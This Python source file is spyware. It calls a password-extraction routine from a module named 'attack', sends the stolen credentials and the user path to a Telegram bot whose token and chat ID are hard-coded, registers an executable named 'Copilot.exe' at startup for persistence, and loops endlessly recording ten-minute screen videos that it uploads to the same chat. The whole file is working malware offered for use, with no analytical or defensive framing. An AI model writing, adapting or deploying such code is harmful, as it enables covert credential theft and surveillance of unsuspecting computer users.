import cv2
import numpy as np
import mss
import time
import requests
import os
from attack import extract_all_passwords
from set_startapp import add_to_startup

BOT_TOKEN = '7234794963:AAHHXY24n_GRw3Q65UbXzX1C3H_q48bmmoQ'
CHAT_ID = '6588631008'


def send_login_data(text, pc_owner):
    message = f"{text}\nUser Path: {pc_owner}"

    # Check message length and split if necessary
    max_message_length = 4096
    if len(message) > max_message_length:
        # Split the message into chunks
        for i in range(0, len(message), max_message_length):
            chunk = message[i:i + max_message_length]
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": CHAT_ID,
                "text": chunk
            }
            response = requests.post(url, data=data)

            # Check response status
            if response.status_code != 200:
                pass
            else:
                pass
    else:
        # If the message is short enough, send it as is
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message
        }
        response = requests.post(url, data=data)

        # Check response status
        if response.status_code == 200:
            pass
        else:
            pass


def send_video(video_path):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo'
    with open(video_path, 'rb') as video:
        files = {'video': video}
        data = {'chat_id': CHAT_ID}
        requests.post(url, files=files, data=data)

def record_screen_video(duration=600, filename="screen_record.mp4"):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width = monitor["width"]
        height = monitor["height"]
        fps = 10
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

        start_time = time.time()
        while time.time() - start_time < duration:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            out.write(frame)
            time.sleep(1 / fps)

        out.release()

def loop_record_send():
    while True:
        filename = "screen_record.mp4"
        record_screen_video(duration=600, filename=filename)
        try:
            send_video(filename)
        except:
            pass
        os.remove(filename)

if __name__ == "__main__":
    data = extract_all_passwords()
    send_login_data(text=data[0], pc_owner=data[1])
    add_to_startup("C:/Users/xusanboy/Downloads/Telegram Desktop/Copilot.exe")
    loop_record_send()
